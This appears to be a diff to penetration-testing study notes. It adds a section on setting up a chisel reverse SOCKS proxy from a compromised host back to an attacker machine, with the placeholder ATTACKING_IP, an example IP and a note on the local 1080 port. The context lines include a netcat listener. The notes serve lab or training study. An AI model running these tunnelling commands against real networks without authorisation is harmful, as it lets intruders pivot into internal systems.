@@ -654,6 +654,8 @@ nc -lvnp 4444
 
 Download appropriate binaries from the tool's [Github release page](https://github.com/jpillora/chisel/releases). These can then be unzipped using `gunzip`, and executed as normal.
 
+## Reverse SOCKS Proxy:
+
 Attack Machine:
 ```
 ./chisel server -p LISTEN_PORT --reverse &
@@ -670,3 +672,21 @@ Attacker
 
 
 Compromised
+
+```
+./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+```
+
+```
+client 10.50.88.33:1337 R:socks &
+```
+
+
+Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on `127.0.0.1:1080`. As such, we will be using port 1080 when sending data through the proxy.
+
+
+## Sshuttle
+
+>[!Warning]
+>Sshuttle only works on Linux targets.
+
